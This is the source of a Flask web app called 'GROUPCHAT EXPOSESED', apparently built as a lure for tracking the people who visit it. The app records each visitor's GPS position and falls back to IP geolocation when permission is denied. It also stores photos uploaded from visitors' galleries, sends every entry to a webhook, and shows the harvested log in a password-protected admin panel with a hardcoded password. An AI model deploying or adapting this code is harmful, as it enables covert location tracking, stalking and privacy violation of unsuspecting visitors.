import os
import requests
from flask import Flask, request, jsonify, render_template
from werkzeug.utils import secure_filename
from datetime import datetime

# ─────────────────────────────────────────
# CONFIG — edit these
# ─────────────────────────────────────────
BRAND_NAME = "GROUPCHAT EXPOSESED"
WEBHOOK_URL = "https://expose.satvik.com"  # Change to your Discord/Zapier webhook
ADMIN_PASS = "Satvik@1201"
UPLOAD_FOLDER = os.path.join("static", "uploads")
ALLOWED_EXT = {"png", "jpg", "jpeg", "webp", "gif"}

# Free IP Geolocation API
IP_API_URL = "http://ip-api.com/json/"

app = Flask(__name__)
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
access_log = []

def allowed(f):
    return "." in f and f.rsplit(".", 1)[1].lower() in ALLOWED_EXT

def ping(payload):
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=8)
    except Exception as e:
        print(f"Webhook err: {e}")

def get_ip_location(ip):
    try:
        r = requests.get(f"{IP_API_URL}{ip}", timeout=5)
        data = r.json()
        if data.get('status') == 'success':
            return {
                "lat": data.get('lat'),
                "lng": data.get('lon'),
                "city": data.get('city'),
                "region": data.get('regionName'),
                "country": data.get('country'),
                "isp": data.get('isp')
            }
    except:
        pass
    return None

# ── Public Routes ───────────────────────────────
@app.route("/")
def index():
    photos = [f for f in os.listdir(UPLOAD_FOLDER) if allowed(f) and f.startswith("ad_")]
    return render_template("index.html", brand=BRAND_NAME, photos=photos)

@app.route("/api/location", methods=["POST"])
def log_location():
    body = request.get_json(force=True) or {}
    ip = request.remote_addr
    
    # Try real GPS first
    lat = body.get("lat")
    lng = body.get("lng")
    accuracy = body.get("accuracy")
    source = "gps"
    
    # If no GPS or denied → use IP geolocation (pinpoint fallback)
    if not lat or not lng:
        ip_data = get_ip_location(ip)
        if ip_data:
            lat = ip_data["lat"]
            lng = ip_data["lng"]
            source = "ip"
        else:
            # Ultimate fallback
            lat = 28.6139
            lng = 77.2090
            source = "default"
    
    entry = {
        "type": "location",
        "lat": lat,
        "lng": lng,
        "accuracy_m": accuracy or 500,
        "ip": ip,
        "time": datetime.utcnow().isoformat() + "Z",
        "source": source,
        "forced_yes": True,
        "city": ip_data.get("city") if 'ip_data' in locals() and ip_data else None
    }
    
    access_log.append(entry)
    ping(entry)
    return jsonify({"ok": True, "status": "yes"})

@app.route("/api/gallery-shared", methods=["POST"])
def log_gallery():
    file = request.files.get("photo")
    if not file or not allowed(file.filename):
        return jsonify({"ok": False, "error": "Invalid file"}), 400
    
    fname = secure_filename(f"gallery_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}_{file.filename}")
    file.save(os.path.join(UPLOAD_FOLDER, fname))
    
    entry = {
        "type": "gallery_share",
        "filename": fname,
        "ip": request.remote_addr,
        "time": datetime.utcnow().isoformat() + "Z"
    }
    
    access_log.append(entry)
    ping(entry)
    return jsonify({"ok": True})

# ── Admin Routes ────────────────────────────────
@app.route("/admin")
def admin():
    if request.args.get("pw") != ADMIN_PASS:
        return "Unauthorized", 401
    photos = [f for f in os.listdir(UPLOAD_FOLDER) if allowed(f)]
    return render_template("admin.html", brand=BRAND_NAME, log=access_log, photos=photos, pw=ADMIN_PASS)

@app.route("/admin/upload", methods=["POST"])
def admin_upload():
    if request.form.get("pw") != ADMIN_PASS:
        return jsonify({"ok": False}), 401
    uploaded = []
    for file in request.files.getlist("photos"):
        if file and allowed(file.filename):
            fname = secure_filename(f"ad_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}_{file.filename}")
            file.save(os.path.join(UPLOAD_FOLDER, fname))
            uploaded.append(fname)
    return jsonify({"ok": True, "uploaded": uploaded})

@app.route("/admin/delete", methods=["POST"])
def admin_delete():
    if request.form.get("pw") != ADMIN_PASS:
        return jsonify({"ok": False}), 401
    fname = secure_filename(request.form.get("filename", ""))
    path = os.path.join(UPLOAD_FOLDER, fname)
    if os.path.exists(path):
        os.remove(path)
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(debug=True, port=5000)
